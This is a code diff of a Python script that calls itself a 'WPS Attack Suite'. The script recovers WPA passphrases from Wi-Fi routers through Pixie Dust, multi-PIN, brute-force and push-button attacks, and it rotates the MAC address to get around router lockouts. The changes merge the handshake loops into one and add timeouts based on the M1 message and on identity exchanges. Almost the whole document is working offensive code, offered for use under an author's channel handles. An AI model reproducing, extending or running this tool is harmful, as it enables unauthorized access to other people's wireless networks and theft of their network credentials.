@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # Noyon.py — ULTRA ENGINE WPS Attack Suite
-# Author: Noyon | Owner: @NOYONRRP | Channel: @mohammad_noyon_rrp
-# Architecture: External Engines | AutoChain | Lock Guard | MAC Rotation
+# Author: Noyon | Owner: @NOYONRRP | Channel: @SGCODEX
+# Fixed: Pixie Dust flow (matches OneShot), colors, layout, handle
 
 import sys
 import subprocess
@@ -38,9 +38,14 @@ except ImportError:
     Figlet = None
 
 
+# ═══════════════════════════════════════════════════════════════════
+#  CONFIGURATION
+# ═══════════════════════════════════════════════════════════════════
 class Config:
     WPA_SUPPLICANT_TIMEOUT = 15
-    WPS_TRANSACTION_TIMEOUT = 90
+    WPS_TRANSACTION_TIMEOUT = 180     # increased (was 90)
+    WPS_M1_TIMEOUT = 45               # abort if no M1 within this time
+    WPS_IDENTITY_LOOP_MAX = 15        # abort after N identity exchanges
     SOCKET_TIMEOUT = 8
     PIXIEWPS_TIMEOUT = 45
     SCAN_TIMEOUT = 45
@@ -56,7 +61,7 @@ class Config:
 
 
 # ═══════════════════════════════════════════════════════════════════
-#  UI — FIXED (Normal colors, Termux-safe)
+#  UI
 # ═══════════════════════════════════════════════════════════════════
 class UI:
     RESET = '\033[0m'; BOLD = '\033[1m'; DIM = '\033[2m'
@@ -158,7 +163,7 @@ def truncate(s, length, postfix='…'):
 
 
 # ═══════════════════════════════════════════════════════════════════
-#  WPS PIN GENERATOR
+#  WPS PIN GENERATOR (same as before)
 # ═══════════════════════════════════════════════════════════════════
 class WPSpin:
     ALGO_MAC = 0; ALGO_EMPTY = 1; ALGO_STATIC = 2
@@ -482,8 +487,10 @@ class ConnectionStatus:
         self.essid = ''
         self.wpa_psk = ''
         self.bssid = ''
-        self.wps_disabled = False     # NEW: detected when router refuses WPS
-        self.wps_unreachable = False  # NEW: no response at all
+        self.wps_disabled = False
+        self.wps_unreachable = False
+        self.identity_exchanges = 0    # NEW: track identity loop
+        self.m1_received = False       # NEW: track if M1 received
 
     def isFirstHalfValid(self): return self.last_m_message > 5
     def clear(self): self.__init__()
@@ -594,7 +601,6 @@ class LockGuard:
             self.rotation_count += 1
             self.fail_count = 0
             self.state = LockState.CLEAN
-
             time.sleep(Config.MAC_ROTATION_DELAY)
             UI.ok(f'MAC rotated to {new_mac} (#{self.rotation_count})')
             return True
@@ -613,13 +619,13 @@ class LockGuard:
                 shell=True, timeout=5, check=False)
             subprocess.run(f'ip link set {self.interface} up',
                            shell=True, timeout=5, check=False)
-            UI.info(f'MAC restored')
+            UI.info('MAC restored')
         except Exception:
             pass
 
 
 # ═══════════════════════════════════════════════════════════════════
-#  COMPANION
+#  COMPANION — FIXED: no drain, no timeout in __handle_wpas loop
 # ═══════════════════════════════════════════════════════════════════
 class Companion:
     def __init__(self, interface, save_result=False, print_debug=False, bssid=''):
@@ -719,6 +725,7 @@ class Companion:
             elif 'Received M' in line:
                 n = int(line.split('Received M')[1])
                 self.connection_status.last_m_message = n
+                self.connection_status.m1_received = True  # NEW
                 UI.info(f'Received M{n}')
                 if n == 5:
                     UI.ok('First half valid')
@@ -753,13 +760,6 @@ class Companion:
                 self.connection_status.status = 'GOT_PSK'
                 self.connection_status.wpa_psk = (
                     bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace'))
-            # NEW: detect WPS completely disabled
-            elif 'WPS: Registration failed' in line or 'WPS registration failed' in line:
-                self.connection_status.wps_disabled = True
-                UI.err('WPS registration refused — likely disabled on router')
-            elif 'WPS: Could not connect' in line or 'Could not connect to' in line:
-                self.connection_status.wps_unreachable = True
-                UI.err('WPS unreachable — router may have WPS off')
         elif ': State: ' in line:
             if '-> SCANNING' in line:
                 self.connection_status.status = 'scanning'
@@ -789,7 +789,8 @@ class Companion:
             self.connection_status.status = 'eapol_start'
             UI.info('EAPOL Start…')
         elif 'EAP entering state IDENTITY' in line:
-            UI.info('Identity Request')
+            self.connection_status.identity_exchanges += 1  # NEW: count
+            UI.info(f'Identity Request (#{self.connection_status.identity_exchanges})')
         elif 'using real identity' in line:
             UI.info('Identity Response')
         elif bssid and bssid in line and 'level=' in line:
@@ -869,7 +870,7 @@ class Companion:
         filename = self.pixiewps_dir + f'{bssid.replace(":", "").upper()}.run'
         with open(filename, 'w') as f:
             f.write(pin)
-        UI.info(f'PIN saved')
+        UI.info('PIN saved')
 
     def cleanup(self):
         try:
@@ -936,9 +937,50 @@ class AttackEngine(ABC):
             UI.err('Cannot bypass lock')
         return False
 
-    def _reset_wps_state(self):
-        self.c.connection_status.wps_disabled = False
-        self.c.connection_status.wps_unreachable = False
+    def _wps_loop(self, bssid, pixiemode=False, pbc_mode=False):
+        """
+        FIXED: Unified WPS loop — no timeout for handshake, relies on
+        wpa_supplicant + checks M1 progress + identity loop counter.
+        """
+        c = self.c
+        start = time.time()
+        while True:
+            try:
+                res = c._Companion__handle_wpas(
+                    pixiemode=pixiemode, pbc_mode=pbc_mode,
+                    verbose=c.print_debug,
+                    bssid=bssid.lower() if bssid else '')
+            except AttributeError:
+                res = c.__handle_wpas(
+                    pixiemode=pixiemode, pbc_mode=pbc_mode,
+                    verbose=c.print_debug,
+                    bssid=bssid.lower() if bssid else '')
+            if not res:
+                break
+            if c.connection_status.status in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
+                break
+            if c.connection_status.wps_disabled or c.connection_status.wps_unreachable:
+                break
+            # NEW: abort if identity loop is too long (router WPS stuck)
+            if c.connection_status.identity_exchanges > Config.WPS_IDENTITY_LOOP_MAX \
+                    and not c.connection_status.m1_received:
+                UI.err(f'Router stuck in identity loop '
+                       f'({c.connection_status.identity_exchanges} exchanges, no M1)')
+                UI.err('Router likely has WPS disabled or unsupported')
+                c.connection_status.wps_disabled = True
+                break
+            # NEW: abort if no M1 within WPS_M1_TIMEOUT
+            if (not c.connection_status.m1_received
+                    and time.time() - start > Config.WPS_M1_TIMEOUT):
+                UI.err('No M1 received — router WPS not responding')
+                c.connection_status.wps_disabled = True
+                break
+            # Absolute timeout (safety)
+            if time.time() - start > Config.WPS_TRANSACTION_TIMEOUT:
+                UI.err('Transaction timeout')
+                c.connection_status.status = 'WPS_FAIL'
+                break
+        return c.connection_status.status
 
 
 # ═══════════════════════════════════════════════════════════════════
@@ -963,14 +1005,6 @@ class SinglePinEngine(AttackEngine):
         c.pixie_creds.clear()
         c.connection_status.clear()
 
-        try:
-            os.set_blocking(c.wpas.stdout.fileno(), False)
-            while c.wpas.stdout.read(1024):
-                pass
-            os.set_blocking(c.wpas.stdout.fileno(), True)
-        except Exception:
-            pass
-
         UI.warn(f"Trying PIN '{pin}'…")
         cmd = f'WPS_REG {bssid} {pin}'
         r = c.sendAndReceive(cmd)
@@ -980,29 +1014,7 @@ class SinglePinEngine(AttackEngine):
             self._handle_lock()
             return False
 
-        start = time.time()
-        while True:
-            try:
-                res = c._Companion__handle_wpas(
-                    pixiemode=False, pbc_mode=False,
-                    verbose=c.print_debug,
-                    bssid=bssid.lower() if bssid else '')
-            except AttributeError:
-                res = c.__handle_wpas(
-                    pixiemode=False, pbc_mode=False,
-                    verbose=c.print_debug,
-                    bssid=bssid.lower() if bssid else '')
-            if not res:
-                break
-            if c.connection_status.status in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
-                break
-            if c.connection_status.wps_disabled or c.connection_status.wps_unreachable:
-                break
-            if time.time() - start > Config.WPS_TRANSACTION_TIMEOUT:
-                UI.err('Transaction timeout')
-                c.connection_status.status = 'WPS_FAIL'
-                break
-
+        self._wps_loop(bssid, pixiemode=False, pbc_mode=False)
         c.sendOnly('WPS_CANCEL')
 
         if c.connection_status.status == 'GOT_PSK':
@@ -1046,9 +1058,8 @@ class MultiPinEngine(AttackEngine):
             if single._wps_attempt(bssid, entry['pin']):
                 return True
 
-            # If WPS disabled on router, don't waste time
             if self.c.connection_status.wps_disabled:
-                UI.err('WPS disabled on router — Multi-PIN cannot proceed')
+                UI.err('WPS disabled — Multi-PIN cannot proceed')
                 return False
 
         UI.err('All PINs failed')
@@ -1056,7 +1067,7 @@ class MultiPinEngine(AttackEngine):
 
 
 # ═══════════════════════════════════════════════════════════════════
-#  ENGINE: Pixie Dust
+#  ENGINE: Pixie Dust — FIXED
 # ═══════════════════════════════════════════════════════════════════
 class PixieDustEngine(AttackEngine):
     name = 'Pixie Dust'
@@ -1108,17 +1119,10 @@ class PixieDustEngine(AttackEngine):
         return self._try_pin(bssid, pin, store_on_fail=True)
 
     def _do_handshake(self, bssid, pin):
+        """FIXED: no drain, uses unified loop."""
         c = self.c
         c.pixie_creds.clear()
         c.connection_status.clear()
-
-        try:
-            os.set_blocking(c.wpas.stdout.fileno(), False)
-            while c.wpas.stdout.read(1024):
-                pass
-            os.set_blocking(c.wpas.stdout.fileno(), True)
-        except Exception:
-            pass
 
         r = c.sendAndReceive(f'WPS_REG {bssid} {pin}')
         if 'OK' not in r:
@@ -1126,35 +1130,14 @@ class PixieDustEngine(AttackEngine):
             self._handle_lock()
             return False
 
-        start = time.time()
-        while True:
-            try:
-                res = c._Companion__handle_wpas(
-                    pixiemode=True, pbc_mode=False,
-                    verbose=c.print_debug,
-                    bssid=bssid.lower() if bssid else '')
-            except AttributeError:
-                res = c.__handle_wpas(
-                    pixiemode=True, pbc_mode=False,
-                    verbose=c.print_debug,
-                    bssid=bssid.lower() if bssid else '')
-            if not res:
-                break
-            if c.connection_status.status in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
-                break
-            if c.connection_status.wps_disabled or c.connection_status.wps_unreachable:
-                break
-            if time.time() - start > Config.WPS_TRANSACTION_TIMEOUT:
-                UI.err('Handshake timeout')
-                c.connection_status.status = 'WPS_FAIL'
-                break
-
+        self._wps_loop(bssid, pixiemode=True, pbc_mode=False)
         c.sendOnly('WPS_CANCEL')
 
         if c.connection_status.status == 'GOT_PSK':
             return True
         elif c.connection_status.status == 'WPS_FAIL':
             self._handle_lock()
+        # Even if NACK, we may have captured handshake data
         return True
 
     def _try_pin(self, bssid, pin, store_on_fail=False):
@@ -1174,7 +1157,7 @@ class PixieDustEngine(AttackEngine):
 
 
 # ═══════════════════════════════════════════════════════════════════
-#  ENGINE: Brute Force
+#  ENGINE: Bruteforce
 # ═══════════════════════════════════════════════════════════════════
 class BruteForceEngine(AttackEngine):
     name = 'Brute Force'
@@ -1220,7 +1203,7 @@ class BruteForceEngine(AttackEngine):
             fn = self.c.sessions_dir + f'{bssid.replace(":", "").upper()}.run'
             with open(fn, 'w') as f:
                 f.write(self.bf_status.mask)
-            UI.info(f'Session saved')
+            UI.info('Session saved')
             raise
 
     def _first_half(self, bssid, start):
@@ -1237,7 +1220,7 @@ class BruteForceEngine(AttackEngine):
                 self.result = True
                 return False
             if self.c.connection_status.wps_disabled:
-                UI.err('WPS disabled — stopping bruteforce')
+                UI.err('WPS disabled — stopping')
                 return False
             if self.c.connection_status.isFirstHalfValid():
                 UI.ok('First half found')
@@ -1290,34 +1273,11 @@ class PBCEngine(AttackEngine):
             cmd = 'WPS_PBC'
         c.pixie_creds.clear()
         c.connection_status.clear()
-        try:
-            os.set_blocking(c.wpas.stdout.fileno(), False)
-            while c.wpas.stdout.read(1024):
-                pass
-            os.set_blocking(c.wpas.stdout.fileno(), True)
-        except Exception:
-            pass
         r = c.sendAndReceive(cmd)
         if 'OK' not in r:
             UI.err(f'PBC rejected: {r.strip()}')
             return False
-        start = time.time()
-        while True:
-            try:
-                res = c._Companion__handle_wpas(
-                    pixiemode=False, pbc_mode=True,
-                    verbose=c.print_debug, bssid='')
-            except AttributeError:
-                res = c.__handle_wpas(
-                    pixiemode=False, pbc_mode=True,
-                    verbose=c.print_debug, bssid='')
-            if not res:
-                break
-            if c.connection_status.status in ('GOT_PSK', 'WPS_FAIL'):
-                break
-            if time.time() - start > Config.WPS_TRANSACTION_TIMEOUT:
-                UI.err('PBC timeout')
-                break
+        self._wps_loop(bssid or '', pixiemode=False, pbc_mode=True)
         c.sendOnly('WPS_CANCEL')
         if c.connection_status.status == 'GOT_PSK':
             target = c.connection_status.bssid or bssid or 'Unknown'
@@ -1329,7 +1289,7 @@ class PBCEngine(AttackEngine):
 
 
 # ═══════════════════════════════════════════════════════════════════
-#  ENGINE: AutoChain — NEW! Cascade: Pixie → Multi-PIN → Bruteforce
+#  ENGINE: AutoChain
 # ═══════════════════════════════════════════════════════════════════
 class AutoChainEngine(AttackEngine):
     name = 'Auto Chain'
@@ -1348,46 +1308,39 @@ class AutoChainEngine(AttackEngine):
         UI.info(f'Chain: Pixie → Multi-PIN' +
                 (' → Bruteforce' if self.allow_bruteforce else ''))
 
-        # ── Stage 1: Pixie Dust ───────────────────────────────────
         UI.stage('Stage 1/3: Pixie Dust')
-        pixie = PixieDustEngine(self.c, self.showcmd, self.force)
         try:
-            if pixie.run(bssid):
+            if PixieDustEngine(self.c, self.showcmd, self.force).run(bssid):
                 return True
         except Exception as e:
-            UI.err(f'Pixie exception: {e}')
+            UI.err(f'Pixie error: {e}')
 
         if self.c.connection_status.wps_disabled:
-            UI.err('Router has WPS disabled — aborting chain')
+            UI.err('WPS disabled — aborting chain')
             return False
 
-        # ── Stage 2: Multi-PIN ────────────────────────────────────
         UI.stage('Stage 2/3: Multi-PIN')
-        multi = MultiPinEngine(self.c)
         try:
-            if multi.run(bssid):
+            if MultiPinEngine(self.c).run(bssid):
                 return True
         except Exception as e:
-            UI.err(f'Multi-PIN exception: {e}')
+            UI.err(f'Multi-PIN error: {e}')
 
         if self.c.connection_status.wps_disabled:
-            UI.err('Router has WPS disabled — aborting chain')
+            UI.err('WPS disabled — aborting chain')
             return False
 
-        # ── Stage 3: Bruteforce (optional) ────────────────────────
         if self.allow_bruteforce:
             UI.stage('Stage 3/3: Bruteforce')
             try:
-                ans = input(f'{UI.CYAN}[?] Start bruteforce? '
-                            f'(slow, 2-10 hours) [n/Y]: {UI.RESET}')
+                ans = input(f'{UI.CYAN}[?] Start bruteforce? (slow) [n/Y]: {UI.RESET}')
                 if ans.lower() != 'n':
-                    br = BruteForceEngine(self.c)
-                    if br.run(bssid):
+                    if BruteForceEngine(self.c).run(bssid):
                         return True
             except KeyboardInterrupt:
                 UI.warn('Bruteforce skipped')
 
-        UI.err('AutoChain exhausted all stages')
+        UI.err('AutoChain exhausted')
         return False
 
 
@@ -1416,7 +1369,7 @@ class EngineRegistry:
 
 
 # ═══════════════════════════════════════════════════════════════════
-#  WIFI SCANNER — FIXED
+#  WIFI SCANNER
 # ═══════════════════════════════════════════════════════════════════
 class WiFiScanner:
     def __init__(self, interface, vuln_list=None, reverse_scan=False):
@@ -1520,7 +1473,6 @@ class WiFiScanner:
                   f'{color("●", "yellow")} Stored')
             print()
 
-        # Compact for Termux
         print(f'  {UI.GRAY}{"#":<3}{"BSSID":<18}{"ESSID":<16}'
               f'{"Sec":<8}{"PWR":<5}{"Vendor":<12}Model{UI.RESET}')
         print(f'  {UI.GRAY}{"─" * 62}{UI.RESET}')
@@ -1704,7 +1656,6 @@ if __name__ == '__main__':
                     UI.ok('Attack succeeded!')
                 else:
                     UI.err('Attack failed')
-                    # Show why
                     if companion.connection_status.wps_disabled:
                         UI.warn('Reason: WPS is disabled on router firmware')
                     elif companion.connection_status.wps_unreachable:
